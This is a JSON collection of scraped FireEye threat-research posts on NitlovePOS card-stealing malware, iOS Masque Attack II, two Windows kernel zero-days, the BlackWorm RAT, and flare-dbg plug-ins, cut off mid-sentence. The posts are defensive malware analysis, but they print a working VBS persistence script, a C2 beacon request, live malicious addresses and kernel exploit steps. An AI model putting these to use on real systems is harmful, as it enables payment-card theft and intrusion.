            "http://www.fireeye.com/blog/threat-research/2015/05/nitlovepos_another.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2015-05-23",
                    "source": "www.fireeye.com"
                },
                "text": "There has been a proliferation of malware specifically designed to extract payment card information from Point-of-Sale (POS) systems over the last two years. In 2015, there have already been a variety of new POS malware identified including a new Alina variant , FighterPOS and Punkey . During our research into a widespread spam campaign, we discovered yet another POS malware that we’ve named NitlovePOS. The NitlovePOS malware can capture and ex-filtrate track one and track two payment card data by scanning the running processes of a compromised machine. It then sends this data to a webserver using SSL. We believe the cybercriminals assess the hosts compromised via indiscriminate spam campaigns and instruct specific victims to download the POS malware. Propagation We have been monitoring an indiscriminate spam campaign that started on Wednesday, May 20, 2015.  The spam emails referred to possible employment opportunities and purported to have a resume attached. The “From” email addresses were spoofed Yahoo! Mail accounts and contained the following “Subject” lines: Subject: Any Jobs? Subject: Any openings? Subject: Internship Subject: Internship questions Subject: Internships? Subject: Job Posting Subject: Job questions Subject: My Resume Subject: Openings? The email came with an attachment named CV_[4 numbers].doc or My_Resume_[4 numbers].doc , which is embedded with a malicious macro. To trick the recipient into enabling the malicious macro, the document claims to be a “protected document.” If enabled, the malicious macro will download and execute a malicious executable from 80.242.123.155/exe/dro.exe . The cybercriminals behind this operation have been updating the payload. So far, we have observed: e6531d4c246ecf82a2fd959003d76cca  dro.exe 600e5df303765ff73dccff1c3e37c03a  dro.exe These payloads beacon to the same server from which they are downloaded and receive instructions to download additional malware hosted on this server. This server contains a wide variety of malware: 6545d2528460884b24bf6d53b721bf9e  5dro.exe e339fce54e2ff6e9bd3a5c9fe6a214ea  AndroSpread.exe 9e208e9d516f27fd95e8d165bd7911e8  AndroSpread.exe abc69e0d444536e41016754cfee3ff90  dr2o.exe e6531d4c246ecf82a2fd959003d76cca  dro.exe 600e5df303765ff73dccff1c3e37c03a  dro.exe c8b0769eb21bb103b8fbda8ddaea2806  jews2.exe 4d877072fd81b5b18c2c585f5a58a56e  load33.exe 9c6398de0101e6b3811cf35de6fc7b79  load.exe ac8358ce51bbc7f7515e656316e23f8d  Pony.exe 3309274e139157762b5708998d00cee0  Pony.exe b3962f61a4819593233aa5893421c4d1  pos.exe 6cdd93dcb1c54a4e2b036d2e13b51216  pos.exe We focused on the “pos.exe” malware and suspected that it maybe targeted Point of Sale machines. We speculate that once the attackers have identified a potentially interesting host form among their victims, they can then instruct the victim to download the POS malware. While we have observed many downloads of the various EXE’s hosed on that server, we have only observed three downloads of “pos.exe”. Technical Analysis We analyzed the “pos.exe” ( 6cdd93dcb1c54a4e2b036d2e13b51216) binary found on the 80.242.123.155 server. (A new version of “pos.exe” ( b3962f61a4819593233aa5893421c4d1 ) was uploaded on May 22, 2015 that has exactly the same malicious behavior but with different file structure.) The binary itself is named “TAPIBrowser” and was created on May 20, 2015. File Name                       : pos.exe File Size                       : 141 kB MD5: 6cdd93dcb1c54a4e2b036d2e13b51216 File Type                       : Win32 EXE Machine Type                    : Intel 386 or later, and compatibles Time Stamp                      : 2015:05:20 09:02:54-07:00 PE Type                         : PE32 File Description                : TAPIBrowser MFC Application File Version                    : 1, 0, 0, 1 Internal Name                   : TAPIBrowser Legal Copyright                 : Copyright (C) 2000 Legal Trademarks                : Original Filename               : TAPIBrowser.EXE Private Build                   : Product Name                    : TAPIBrowser Application Product Version                 : 1, 0, 0, 1: The structure of the file is awkward; it only contains three sections: .rdata, .hidata and .rsrc and the entry point located inside . hidata : When executed, it will copy itself to disk using a well-known hiding technique via NTFS Alternate Data Streams (ADS) as: ~\\Local Settings\\Temp:defrag.scr Then will create a vbs script and save it to disk, again using ADS: ~\\Local Settings\\Temp:defrag.vbs By doing this, the files are not visible in the file system and therefore are more difficult to locate and detect. Once the malware is running, the “ defrag.vbs ” script monitors for attempts to delete the malicious process via InstanceDeletion Event ; it will re-spawn the malware if the process is terminated. Here is the code contained within “ defrag.vbs ”: Set f=CreateObject(\"Scripting.FileSystemObject\") Set W=CreateObject(\"WScript.Shell\") Do While GetObject(\"winmgmts:Win32_Process\").Create(W.ExpandEnvironmentStrings(\"\"\"%TMP%:Defrag.scr\"\" -\"),n,n,p)=0 GetObject(\"winmgmts:\\\\.\\root\\cimv2\").ExecNotificationQuery(\"Select * From __InstanceDeletionEvent Within 1 Where TargetInstance ISA 'Win32_Process' AND TargetInstance.ProcessID=\"&p).NextEvent if(f.FileExists(WScript.ScriptFullName)=false)then W.Run(W.ExpandEnvironmentStrings(\"cmd /C /D type nul > %TMP%:Defrag.scr\")), 0, true Exit Do End If Loop The malware ensures that it will run after every reboot by adding itself to the Run registry key: \\REGISTRY\\MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\\"Defrag\" = wscript \"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp:defrag.vbs\" NitlovePOS expects to be run with the “-“ sign as argument; otherwise it won’t perform any malicious actions. This technique can help bypass some methods of detection, particularly those that leverage automation. Here is an example of how the malware is executed: \\LOCALS~1\\Temp:Defrag.scr\" - If the right argument is provided, NitlovePOS will decode itself in memory and start searching for payment card data. If it is not successful, NitlovePOS will sleep for five minutes and restart the searching effort. NitlovePOS has three main threads: Thread 1 :  SSL C2 Communications Thread 2 : MailSlot monitoring waiting for CC. Thread 3 : Memory Scrapping Thread 1:  C2 Communications NitlovePOS is configured to connect to one of three hardcoded C2 servers: systeminfou48[.]ru infofinaciale8h[.]ru helpdesk7r[.]ru All three of these domains resolve to the same IP address: 146.185.221.31 . This IP address is assigned to a network located in St. Petersburg, Russia. As soon as NitlovePOS starts running on the compromised system, it will initiate a callback via SSL: POST /derpos/gateway.php HTTP/1.1 User-Agent: nit_love<GUID> Host: systeminfou48.ru Content-Length: 41 Connection: Keep-Alive Cache-Control: no-cache Pragma: no-cache F.r.HWAWAWAWA <computer name> <OS Version> Y The User-Agent header contains a hardcoded string “nit_love” and the Machine GUID, which is not necessarily unique but can be used as an identifier by the cybercriminals. The string “HWAWAWAWA” is hardcoded and may be a unique campaign identifier; the “F.r.” is calculated per infected host. Thread 2: MailSlot monitoring waiting for payment card data A mailslot is basically a shared range of memory that can be used to store data; the process creating the mailslot acts as the server and the clients can be other hosts on the same network, local processes on the machine, or local threads in the same process. NitlovePOS uses this feature to store payment card information; the mailslot name that is created comes as a hardcoded string in the binary (once de-obfuscated); \"\\\\.\\mailslot\\95d292040d8c4e31ac54a93ace198142\" Once the mailslot is created, an infinite loop will keep querying the allocated space. Thread 3: Memory Scrapping NitlovePOS scans running processes for payment data and but will skip System and “System Idle Process.” It will try to match track 1 or track 2 data and, if found, will write the data into the mailslot created by Thread 2. This information is then sent via POST it to the C2 using SSL, which makes network-level detection more difficult. Possible Control Panel During our research we observed what appears to be a test control panel on a different, but probably related, server that matches with NitlovePOS. This panel is called “nitbot,” which is similar to the “nit_love” string found in the binary and was located in a directory called “derpmo” which is similar to the “derpos” used in this case. The information contained in the NitlovePOS beacon matches the fields that are displayed in the Nitbot control panel. These include the machines GIUD that is transmitted in the User-Agent header as well as an identifier “HWAWAWAWA,” which aligns with the “group name” that can be used by the cybercriminals to track various campaigns. The control panel contains a view that lists the “tracks,” or stolen payment card data. This indicates that this panel is for malware capable of stealing data from POS machines that matches up with the capability of the NitlovePOS malware. Conclusion Even cybercriminals engaged in indiscriminate spam operations have POS malware available and can deploy it to s subset of their victims. Due to the widespread use of POS malware, they are eventually discovered and detection increases. However, this is followed by the development of new POS with very similar functionality. Despite the similarity, the detection levels for new variants are initially quite low. This gives the cybercriminals a window of opportunity to exploit the use of a new variant. We expect that new versions of functionally similar POS malware will continue to emerge to meet the demand of the cybercrime marketplace. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2015/02/ios_masque_attackre.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2015-02-19",
                    "source": "www.fireeye.com"
                },
                "text": "In November of last year, we uncovered a major flaw in iOS we dubbed “ Masque Attack ” that allowed for malicious apps to replace existing, legitimate ones on an iOS device via SMS, email, or web browsing. In total, we have notified Apple of five security issues related to four kinds of Masque Attacks. Today, we are sharing Masque Attack II in the series – part of which has been fixed in the recent iOS 8.1.3 security content update [2]. Masque Attack II includes bypassing iOS prompt for trust and iOS URL scheme hijacking. iOS 8.1.3 fixed the first part whereas the iOS URL scheme hijacking is still present. iOS app URL scheme “lets you communicate with other apps through a protocol that you define.” [1] By deliberately defining the same URL schemes used by other apps, a malicious app can still hijack the communications towards those apps and mount phishing attacks to steal login credentials. Even worse than the first Masque Attack [3], attackers might be able to conduct Masque Attack II through an app in the App Store. We describe these two parts of Masque Attack II in the following sections. Bypassing Prompt for Trust When the user clicks to open an enterprise-signed app for the first time, iOS asks whether the user trusts the signing party. The app won’t launch unless the user chooses “Trust”.  Apple suggested defending against Masque Attack by the aid of this “Don’t Trust” prompt [8]. We notified Apple that this was inadequate. We find that when calling an iOS URL scheme, iOS launches the enterprise-signed app registered to handle the URL scheme without prompting for trust. It doesn’t matter whether the user has launched that enterprise-signed app before. Even if the user has always clicked “Don’t Trust”, iOS still launches that enterprise-signed app directly upon calling its URL scheme. In other words, when the user clicks on a link in SMS, iOS Mail or Google Inbox, iOS launches the target enterprise-signed app without asking for user’s “Trust” or even ignores user’s “Don’t Trust”. An attacker can leverage this issue to launch an app containing a Masque Attack. By crafting and distributing an enterprise-signed malware that registers app URL schemes identical to the ones used by legitimate popular apps, an attacker may hijack legitimate apps’ URL schemes and mimic their UI to carry out phishing attacks, e.g. stealing the login credentials. iOS doesn’t protect users from this attack because it doesn’t prompt for trust to the user when launching such an enterprise-signed malware for the first time through app URL scheme. In Demo Video 1, we explain this issue with concrete examples. We’ve also found other approaches to bypass “Don’t Trust” protection through iOS springboard. We confirmed these problems on iOS 7.1.2, 8.1.1, 8.1.2 and 8.2 beta. Recently Apple fixed these issues and acknowledged our findings in CVE-2014-4494 in the iOS 8.1.3 security content [2]. As measured by the App Store on 2 Feb 2015 [4], however, 28% devices use iOS version 7 or lower, which are still vulnerable. Of the 72% iOS 8 devices, some are also vulnerable given that iOS 8.1.3 came out in late January 2015. We encourage users to upgrade their iOS devices to the latest version as soon as possible. URL Scheme Hijacking According to iOS Developer Library, “If more than one third-party\napp registers to handle the same URL scheme, there is currently no\nprocess for determining which app will be given that scheme” [1].\nHowever, when two apps register the same URL scheme, iOS always\nlaunches the same one to handle it in our experiments using multiple\niOS versions and device models. Furthermore, one app can block another\napp from handling the same URL scheme if the developer crafts the\nbundle id carefully. The mechanism of URL scheme handling seems more like a “feature”\ninstead of a “bug” for iOS App Store which allows apps from different\ndevelopers to share the same URL schemes. On iOS App Store, the two\napps “BASCOM Anywhere Filter Browser” [5] and “Chrome - web browser by\nGoogle” [6] both registered the URL schemes “googlechrome://” and \n“googlechromes://”. With both apps installed, an iOS 8.1.3 device\nlaunches “BASCOM Anywhere Filter Browser” instead of Google’s Chrome\nbrowser when the user clicks on a link shown in Safari browser which\nuses the scheme “googlechrome://” or  “googlechromes://”. We’ve also seen 28 App Store apps all registering the URL scheme\n“fb://”, which is one of the URL scheme registered by the Facebook\napp. 16 of these 28 apps are not from Facebook. At least 8048 App\nStore apps register the same URL scheme “fb118493188254996” and many\nof these apps are from different developers. Attackers can either publish an “aggressive” app into the App Store,\nor craft and distribute an enterprise-signed/ad-hoc malware that\nregisters app URL schemes identical to the ones of legitimate popular\napps. Through this , attackers can mimic a legitimate app’s UI to\ncarry out phishing attacks to steal login credentials or gather data\nintended to be shared between two trusted apps. As an example, the Chrome web browser by Google [6] registers four\nURL schemes: \"com.google.sso.75882956776-quflk872g5nq29l4p16ql1u6956mehe1\",\n\"googlechrome\", \"googlechromes\",\n\"googlechrome-x-callback\",\n\"com.google.sso.chrome\". One enterprise-signed app that\nregisters the same set of URL schemes on iOS 8.1.3 and earlier\nversions is able to hijack web links when the user clicks them from\nthe emails in Gmail app, from web pages displayed by Safari or from\nSMS messages. Demo Video 2 describes one such attack scenario. Previous studies [9] have also recognized the risk in the way iOS\nhandling the URL schemes. However, bypassing prompt for trust gave\nenterprise-signed apps the leverage to exploit this issue silently. Conclusions Both App Store and iOS treat it as a feature to allow apps from\ndifferent developers to bear the same URL schemes. Fixing URL scheme\nhijacking may not be easy for Apple. With this article and a previous\none [3], we have disclosed two out of four Masque Attacks, with the\nother two still being fixed by Apple. As suggested in our VB’14 paper\n[7], Apple may improve its architecture to collaborate with security\nvendors for a better enterprise-level security solution. We address\nthis problem in this article to help users better protect themselves. We thank FireEye team member Joshua Chang for his help in creating\nthe demo videos and Kyrksen Storer for improving this blog. [1] https://developer.apple.com/library/ios/documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/Inter-AppCommunication/Inter-AppCommunication.html [2] http://support.apple.com/en-us/HT204245 [3] https://www.fireeye.com/blog/threat-research/2014/11/masque-attack-all-your-ios-apps-belong-to-us.html [6] https://itunes.apple.com/us/app/chrome-web-browser-by-google/id535886823?mt=8 [7] https://www.virusbtn.com/virusbulletin/archive/2014/11/vb201411-Apple-without-shell [8] http://support.apple.com/en-us/HT6584 [9] http://software-security.sans.org/blog/2010/11/08/insecure-handling-url-schemes-apples-ios/ Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/10/two-targeted-attacks-two-new-zero-days.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2014-10-14",
                    "source": "www.fireeye.com"
                },
                "text": "The FireEye Labs team has identified two new zero-day vulnerabilities as part of limited, targeted attacks against some major corporations. Both zero-days exploit the Windows Kernel, with Microsoft assigning CVE-2014-4148 and CVE-2014-4113 to and addressing the vulnerabilities in their October 2014 Security Bulletin . FireEye Labs have identified 16 total zero-day attacks in the last two years – uncovering 11 in 2013 and five in 2014 so far. Microsoft commented: “On October 14, 2014, Microsoft released MS14-058 to fully address these vulnerabilities and help protect customers. We appreciate FireEye Labs using Coordinated Vulnerability Disclosure to assist us in working toward a fix in a collaborative manner that helps keep customers safe.” In the case of CVE-2014-4148, the attackers exploited a vulnerability in the Microsoft Windows TrueType Font (TTF) processing subsystem, using a Microsoft Office document to embed and deliver a malicious TTF to an international organization. Since the embedded TTF is processed in kernel-mode, successful exploitation granted the attackers kernel-mode access. Though the TTF is delivered in a Microsoft Office document, the vulnerability does not reside within Microsoft Office. CVE-2014-4148 impacted both 32-bit and 64-bit Windows operating systems shown in MS14-058 , though the attacks only targeted 32-bit systems. The malware contained within the exploit has specific functions adapted to the following operating system platform categories: Windows 8.1/Windows Server 2012 R2 Windows 8/Windows Server 2012 Windows 7/Windows Server 2008 R2 (Service Pack 0 and 1) Windows XP Service Pack 3 CVE-2014-4113 rendered Microsoft Windows 7, Vista, XP, Windows 2000, Windows Server 2003/R2, and Windows Server 2008/R2 vulnerable to a local Elevation of Privilege (EoP) attack. This means that the vulnerability cannot be used on its own to compromise a customer’s security. An attacker would first need to gain access to a remote system running any of the above operating systems before they could execute code within the context of the Windows Kernel. Investigation by FireEye Labs has revealed evidence that attackers have likely used variations of these exploits for a while. Windows 8 and Windows Server 2012 and later do not have these same vulnerabilities. Information on the companies affected, as well as threat actors, is not available at this time. We have no evidence of these exploits being used by the same actors. Instead, we have only observed each exploit being used separately, in unrelated attacks. About CVE-2014-4148 Mitigation Microsoft has released security update MS14-058 that addresses CVE-2014-4148. Since TTF exploits target the underlying operating system, the vulnerability can be exploited through multiple attack vectors, including web pages. In the past, exploit kit authors have converted a similar exploit (CVE-2011-3402) for use in browser-based attacks. More information about this scenario is available under Microsoft’s response to CVE-2011-3402: MS11-087 . Details This TTF exploit is packaged within a Microsoft Office file. Upon opening the file, the font will exploit a vulnerability in the Windows TTF subsystem located within the win32k.sys kernel-mode driver. The attacker’s shellcode resides within the Font Program (fpgm) section of the TTF. The font program begins with a short sequence of instructions that quickly return. The remainder of the font program section is treated as unreachable code for the purposes of the font program and is ignored when initially parsing the font. During exploitation, the attacker’s shellcode uses Asynchronous Procedure Calls (APC) to inject the second stage from kernel-mode into the user-mode process winlogon.exe (in XP) or lsass.exe (in other OSes). From the injected process, the attacker writes and executes a third stage (executable). The third stage decodes an embedded DLL to, and runs it from, memory. This DLL is a full-featured remote access tool that connects back to the attacker. Plenty of evidence supports the attacker’s high level of sophistication. Beyond the fact that the attack is zero-day kernel-level exploit, the attack also showed the following: a usable hard-coded area of kernel memory is used like a mutex to avoid running the shellcode multiple times the exploit has an expiration date: if the current time is after October 31, 2014, the exploit shellcode will exit silently the shellcode has implementation customizations for four different types of OS platforms/service pack levels, suggesting that testing for multiple OS platforms was conducted the dropped malware individually decodes each string when that string is used to prevent analysis the dropped malware is specifically customized for the targeted environment the dropped remote access capability is full-featured and customized: it does not rely on generally available implementations (like Poison Ivy) the dropped remote access capability is a loader that decrypts the actual DLL remote access capability into memory and never writes the decrypted remote access capability to disk About CVE-2014-4113 Mitigation Microsoft has released security update MS14-058 that addresses this vulnerability. Vulnerability and Exploit Details The 32-bit exploit triggers an out-of-bounds memory access that dereferences offsets from a high memory address, and inadvertently wraps into the null page. In user-mode, memory dereferences within the null page are generally assumed to be non-exploitable. Since the null page is usually not mapped – the exception being 16-bit legacy applications emulated by ntvdm.exe--null pointer dereferences will simply crash the running process. In contrast, memory dereferences within the null page in the kernel are commonly exploited because the attacker can first map the null page from user-mode, as is the case with this exploits. The steps taken for successful 32-bit exploitation are: Map the null page: ntdll!ZwAllocateVirtualMemory(…,BaseAddress=0x1, …) Build a malformed win32k!tagWND structure at the null page such that it is properly validated in the kernel Trigger vulnerability Attacker’s callback in win32k!tagWND.lpfnWndProc executes in kernel-mode Callback overwrites EPROCESS.Token to elevate privileges Spawns a child process that inherits the elevated access token 32-bit Windows 8 and later users are not affected by this exploit. The Windows 8 Null Page protection prohibits user-mode processes from mapping the null page and causes the exploits to fail. In the 64-bit version of the exploit, dereferencing offsets from a high 32-bit memory address do not wrap, as it is well within the addressable memory range for a 64-bit user-mode process. As such, the Null Page protection implemented in Windows versions 7 (after MS13-031) and later does not apply. The steps taken by the 64-bit exploit variants are: Map memory page: ntdll!ZwAllocateVirtualMemory(…) Build a malformed win32k!tagWND structure at the mapped page such that it is properly validated in the kernel Trigger vulnerability Attacker’s callback in win32k!tagWND.lpfnWndProc executes in kernel-mode Callback overwrites EPROCESS.Token to elevate privileges Spawns a child process that inherits the elevated access token 64-bit Windows 8 and later users are not affected by this exploit. Supervisor Mode Execution Prevention (SMEP) blocks the attacker’s user-mode callback from executing within kernel-mode and causes the exploits to fail. Exploits Tool History The exploits are implemented as a command line tool that accepts a single command line argument – a shell command to execute with SYSTEM privileges. This tool appears to be an updated version of an earlier tool. The earlier tool exploited CVE-2011-1249, and displays the following usage message to stdout when run: Usage:system_exp.exe cmd Windows Kernel Local Privilege Exploits The vast majority of samples of the earlier tool have compile dates in December 2009.  Only two samples were discovered with compile dates in March 2011. Although the two samples exploit the same CVE, they carry a slightly modified usage message of: Usage:local.exe cmd Windows local Exploits The most recent version of the tool, which implements CVE-2014-4113, eliminates all usage messages. The tool appears to have gone through at least three iterations over time. The initial tool and exploits is believed to have had limited availability, and may have been employed by a handful of distinct attack groups. As the exploited vulnerability was remediated, someone with access to the tool modified it to use a newer exploit when one became available. These two newer versions likely did not achieve the widespread distribution that the original tool/exploits did and may have been retained privately, not necessarily even by the same actors. We would like to thank Barry Vengerik, Joshua Homan, Steve Davis, Ned Moran, Corbin Souffrant, Xiaobo Chen for their assistance on this research. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/08/connecting-the-dots-syrian-malware-team-uses-blackworm-for-attacks.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2014-08-29",
                    "source": "www.fireeye.com"
                },
                "text": "The Syrian Electronic Army has made news for its recent attacks on major communications websites , Forbes , and an alleged attack on CENTCOM . While these attacks garnered public attention, the activities of another group - The Syrian Malware Team - have gone largely unnoticed. The group’s activities prompted us to take a closer look. We discovered this group using a .NET based RAT called BlackWorm to infiltrate their targets. The Syrian Malware Team is largely pro-Syrian government, as seen in one of their banners featuring Syrian President Bashar al-Assad. Based on the sentiments publicly expressed by this group it is likely that they are either directly or indirectly involved with the Syrian government. Further certain members of the Syrian Malware Team have ties to the Syrian Electronic army (SEA) known to be linked to the Syrian government . This indicates that the Syrian Malware Team may also be possibly an offshoot or part of the SEA. Banner used by the Syrian Malware Team BlackWorm Authorship We found at least two distinct versions of the BlackWorm tool, including an original/private version (v0.3.0) and the Dark Edition (v2.1). The original BlackWorm builder was co-authored by Naser Al Mutairi from Kuwait, better known by his online moniker 'njq8'. He is also known to have coded njw0rm , njRAT/LV , and earlier versions of H-worm/Houdini . We found his code being used in a slew of other RATs such as Fallaga and Spygate. BlackWorm v0.3.0 was also co-authored by another actor, Black Mafia. About section within the original version of BlackWorm builder Within the underground development forums, it’s common for threat actors to collaborate on toolsets. Some write the base tools that other attackers can use; others modify and enhance existing tools. The BlackWorm builder v2.1 is a prime example of actors modifying and enhancing current RATs. After njq8 and Black Mafia created the original builder, another author, Black.Hacker, enhanced its feature set. About section within BlackWorm Dark Edition builder Black.Hacker's banner on social media As an interesting side note, 'njq8' took down his blog in recent months and announced a cease in all malware development activity on his Twitter and Facebook account, urging others to stop as well. This is likely a direct result of the lawsuit filed against him by Microsoft . BlackWorm RAT Features The builder for BlackWorm v0.3.0 is fairly simple and allows for very quick payload, but doesn’t allow any configuration other than the IP address for command and control (C2). Building binary through BlackWorm v0.3.0 BlackWorm v0.3.0 controller BlackWorm v0.3.0 supports the following commands between the controller and the implant: ping Checks if victim is online closeserver Exits the implant restartserver Restarts the implant sendfile Transfer and run file from server download Download and run file from URL ddos Ping flood target msgbox Message interaction with victim down Kill critical windows processes blocker Block specified website by pointing resolution to 127.0.0.1 logoff Logout out of windows restart Restart system shutdown Shutdown system more Disable task manager, registry tools, system restore. Also blocks keyboard and mouse input hror Displays a startling flash video In addition to the features supported by the command structure, the payload can: Seek and kill no-ip processes DUC30 and DUC20 Disable Task Manager to kill process dialog Copy itself to USB drives and create autorun entries Copy itself to common peer-to-peer (P2P) share locations Collect system information such as OS, username, hostname, presence of camera, active window name, etc., to display in the controller Kill the following analysis processes (if found): procexp SbieCtrl SpyTheSpy SpeedGear Wireshark MBAM ApateDNS IPBlocker cPorts ProcessHacker AntiLogger The Syrian Malware Team primarily uses another version of BlackWorm called the Dark Edition (v2.1). BlackWorm v2.1 was released on a prolific underground forum where information and code is often shared, traded and sold. BlackWorm v2.1 has the same abilities as the original version and additional functionality, including bypassing UAC, disabling host firewalls and spreading over network shares. Unlike its predecessor, it also allows for granular control of the features available within the RAT. These additional controls allow the RAT user to enable and disable features as needed. Binary output can be also be generated in multiple formats, such as .exe, .src and .dll. BlackWorm Dark Edition builder Syrian Malware Team We observed activity from the Syrian Malware Team going as far back as Jan. 1, 2011. Based on Facebook posts, they are allegedly directly or indirectly involved with the Syrian government. Their Facebook page shows they are still very active, with a post as recent as July 16 th , 2014. Syrian Malware Team’s Facebook page The Syrian Malware Team has been involved in everything from profiling targets to orchestrating attacks themselves. There are seemingly multiple members, including: https://www.facebook.com/hawk.syrian.9 https://www.facebook.com/kays.syr Partial list of self-proclaimed Syrian Malware Team members Some of these people have posted malware-related items on Facebook. Facebook posting of virus scanning of files While looking for Dark Edition samples, we discovered a binary named svchost.exe (MD5: 015c51e11e314ff99b1487d92a1ba09b). We quickly saw indicators that it was created by BlackWorm Dark Edition. Configuration options within code The malware communicated out to 178.44.115.196, over port 5050, with a command structure of: !0/j|n\\12121212_64F3BF1F/j|n\\{Hostname}/j|n\\{Username}/j|n\\USA/j|n\\Win 7 Professional SP1 x86/j|n\\No/j|n\\2.4.0 [ Dark Edition]/j|n\\/j|n\\{ActiveWindowName}/j|n\\[endof] When looking at samples of Dark Edition BlackWorm being used by the Syrian Malware Team, the strings “Syrian Malware,” or “ Syrian Malware Team ” are often used in the C2 communications or within the binary strings. Additional pivoting off of svchost.exe brought us to three additional samples apparently built with BlackWorm Dark Edition. E.exe, (MD5: a8cf815c3800202d448d035300985dc7) a binary that drew our attention, looked to be a backdoor with the Syrian Malware strings within it. When executed, the binary beacons to aliallosh.sytes.net on port 1177. This C2 has been seen in multiple malware runs often associated with Syria.  The command structure of the binary is: !0/j|n\\Syrian Malware/j|n\\{Hostname}/j|n\\{Username}/j|n\\USA/j|n\\Win 7 Professional SP1 x86/j|n\\No/j|n \\0.1/j|n\\/j|n\\{ActiveWindowName}/j|n\\[endof] Finally, pivoting to another sample, 1gpj.srcRania (MD5:f99c15c62a5d981ffac5fdb611e13095), the same strings were present. The string \"Rania\" used as a lure was in Arabic and likely refers to the prolific Queen Rania of Jordan . The traffic is nearly identical to the other samples we identified and tied to the Syrian Malware Team. !1/j|n\\C:\\Documents and Settings\\{Username}\\Local Settings\\Application DataldoDrZdpkK.jpg - Windows Internet Explorer[endof]!0/j|n\\Syrian Malware/j|n\\{Hostname}/j|n\\{Username}/j|n\\USA/j|n\\Win XP ProfessionalSP2 x86/j|n\\No/j|n\\0.1/j|n\\/j|n\\C:\\Documents and Settings\\{Username}\\Local Settings\\Application DataldoDrZdpkK.jpg - {ActiveWindowName}/j|n\\[endof] Conclusion Determining which groups use which malware is often very difficult. Connecting the dots between actors and malware typically involves looking at binary code, identifying related malware examples associated with those binaries, and reviewing infection vectors, among other things. This blog presents a prime example of the process of attribution. We connected a builder with malware samples and the actors/developers behind these attacks. This type of attribution is key to creating actionable threat intelligence to help proactively protect organizations. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2016/02/flare_script_series.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2016-02-09",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction This post continues the FireEye Labs Advanced Reverse Engineering (FLARE) script series. In this post, we continue to discuss the flare-dbg project. If you haven’t read my first post on using flare-dbg to automate string decoding, be sure to check it out! We created the flare-dbg Python project to support the creation of plug-ins for WinDbg. When we harness the power of WinDbg during malware analysis, we gain insight into runtime behavior of executables. flare-dbg makes this process particularly easy. This blog post discusses WinDbg plug-ins that were inspired by features from other debuggers and analysis tools. The plug-ins focus on collecting runtime information and interacting with malware during execution. Today, we are introducing three flare-dbg plug-ins, which are summarized in Table 1. Table 1: flare-dbg plug-in summary To demonstrate the functionality of these plug-ins, this post uses a banking trojan (MD5: 03BA3D3CEAE5F11817974C7E4BE05BDE) known as TINBA to FireEye. injectfind Background A common technique used by malware is code injection. When malware allocates a memory region to inject code, the created region contains certain characteristics we use to identify them in a process’s memory space. The injectfind plug-in finds and displays information about injected regions of memory from within WinDbg. The injectfind plug-in is loosely based off the Volatility malfind plug-in. Given a memory dump, the Volatility variant searches memory for injected code and shows an analyst injected code found within processes. Instead of requiring a memory dump, the injectfind WinDbg plug-in runs in a debugger. Similar to malfind , the injectfind plug-in identifies memory regions that may have had code injected and prints a hex dump and a disassembly listing of each identified memory region. A quick glance at the output helps us identify injected code or hooked functions. The following section shows an example of an analyst identifying injected code with injectfind . Example After running the TINBA malware in an analysis environment, we observe that the initial loader process exits immediately, and the explorer.exe process begins making network requests to seemingly random domains. After attaching to the explorer.exe process with Windbg and running the injectfind plug-in, we see the output shown in Figure 1. Figure 1: Output from the injectfind plug-in The first memory region at virtual address 0x1700000 appears to contain references to Windows library functions and is 0x17000 bytes in size. It is likely that this memory region contains the primary payload of the TINBA malware. The second memory region at virtual address 0x1CD0000 contains a single page, 0x1000 bytes in length, and appears to have two lines of meaningful disassembly. The disassembly shows the eax register being set to 0x30 and a jump five bytes into the NtCreateProcessEx function. Figure 2 shows the disassembly of the first few instructions of the NtCreateProcessEx function. Figure 2: NtCreateProcessEx disassembly listing The first instruction for NtCreateProcessEx is a jmp to an address outside of ntdll's memory. The destination address is within the first memory region that injectfind identified as injected code. We can quickly conclude that the malware creates a function hook for process creation all from within a Windbg debugger session. membreak Background One feature missing from Windbg that is present in OllyDbg and x64dbg is the ability to set a breakpoint on an entire memory region. This type of breakpoint is known as a memory breakpoint. Memory breakpoints are used to pause a process when a specified region of memory is executed. Memory breakpoints are useful when you want to break on code execution without specifying a single address. For example, many packers unpack their code into a new memory region and begin executing somewhere in this new memory. Setting a memory breakpoint on the new memory region would pause the debugger at the first execution anywhere within the new memory region. This obviates the need to tediously reverse engineer the unpacking stub to identify the original entry point. One way to implement memory breakpoints is by changing the memory protection for a memory region by adding the PAGE_GUARD memory protection flag. When this memory region is executed, a STATUS_GUARD_PAGE_VIOLATION exception occurs. The debugger handles the exception and returns control to the user. The flare-dbg plug-in membreak uses this technique to implement memory breakpoints. Example After locating the injected code using the injectfind plug-in, we set a memory breakpoint to pause execution within the injected code memory region. The membreak plug-in accepts one or multiple addresses as parameters. The plug-in takes each address, finds the base address for the corresponding memory region, and changes the entire region’s permissions. As shown in Figure 3, when the membreak plug-in is run with the base address of the injected code as the parameter, the debugger immediately begins running until one of these memory regions is executed. Figure 3: membreak plug-in run in Windbg The output for the memory breakpoint hit shows a Guard page violation and a message about first chance exceptions. As explained above, this should be expected. Once the breakpoint is hit, the membreak plug-in restores the original page permissions and returns control to the analyst. importfind Background Malware often loads Windows library functions at runtime and stores the resolved addresses as global variables. Sometimes it is trivial to resolve these statically in IDA Pro, but other times this can be a tedious process. To speed up the labeling of these runtime imported functions, we created a plug-in named importfind to find these function addresses. Behind the scenes, the plug-in parses each library's export table and finds all exported function addresses. The plug-in then searches the malware’s memory and identifies references to the library function addresses. Finally, it generates an IDAPython script that can be used to annotate an IDB workspace with the resolved library function names. Example Going back to TINBA, we saw text referencing Windows 